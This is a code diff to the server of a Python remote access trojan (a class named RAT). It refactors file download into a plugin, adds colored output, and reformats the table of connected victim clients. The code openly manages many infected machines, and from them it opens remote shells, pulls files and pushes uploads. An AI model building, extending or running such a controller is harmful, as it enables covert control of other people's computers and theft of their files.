@@ -2,8 +2,8 @@ import time
 import socket
 import threading
 from queue import Queue
-
-from server.plugins import get_geolocation, shell
+from rich import print
+from server.plugins import get_geolocation, shell, download
 from server.banner import print_banner, ABOUT_BANNER
 
 
@@ -59,7 +59,7 @@ class RAT:
         print(ABOUT_BANNER)
 
         while True:
-            cmd = input('rat> ')
+            cmd = input('>> ')
             if cmd == 'help' or cmd == 'h':
                 print_banner(0)
 
@@ -80,7 +80,7 @@ class RAT:
 
         while True:
             try:
-                cmd = input('> ')
+                cmd = input(f'{conn.getsockname()}> ')
                 if cmd == 'exit':
                     break
 
@@ -94,17 +94,33 @@ class RAT:
                     shell(cmd='shell', conn=conn)
 
                 elif cmd[:8] == 'download':
-                    try:
-                        file_name = input('input local filename to save ')
-                        with open(file_name, "w") as file:
-                            conn.send(cmd.encode())
-                            data = conn.recv(2147483647).decode()
-                            file.write(data)
 
-                            print('successful download')
+                    download(cmd=cmd, conn=conn)
 
-                    except Exception as err:
-                        print("Error ", err)
+                    # conn.send(cmd.encode())
+                    #
+                    # with open('test1_test.mp4', 'wb') as file:
+                    #     while True:
+                    #         data = conn.recv(1024)
+                    #
+                    #         if data.endswith('end'.encode()):
+                    #             file.write(data)
+                    #             break
+                    #
+                    #         file.write(data)
+                    # print("success download")
+
+                    # try:
+                    #     file_name = input('input local filename to save ')
+                    #     with open(file_name, "w") as file:
+                    #         conn.send(cmd.encode())
+                    #         data = conn.recv(2147483647).decode()
+                    #         file.write(data)
+                    #
+                    #         print('successful download')
+                    #
+                    # except Exception as err:
+                    #     print("Error ", err)
 
                 elif cmd == 'upload':
                     conn.send(cmd.encode())
@@ -140,6 +156,8 @@ class RAT:
 
     def __get_connections(self) -> None:
 
+        print('[bold yellow]List of connected clients:[/bold yellow]')
+
         connections = ''
         for i, conn in enumerate(self.all_connections):
             try:
@@ -149,9 +167,17 @@ class RAT:
                 self.all_connections.pop(i)
                 self.all_address.pop(i)
                 continue
-            connections += str(i) + " " + str(self.all_address[i][0] + "\n")
+            connections += f'|        {str(i)}           |       {str(self.all_address[i][0])}   | \n'
 
-        print("List of connected clients" + "\n" + connections)
+        if len(connections) == 0:
+            print('[bold blue]connection list is empty[/bold blue]')
+        else:
+            print('------------------------------------------')
+            print('|        id           |      ip address  |')
+            print('------------------------------------------')
+            print()
+            print(connections)
+        # print("[bold yellow]List of connected clients[/bold yellow]" + "\n" + connections)
 
     def __create_socket(self) -> None:
         try:
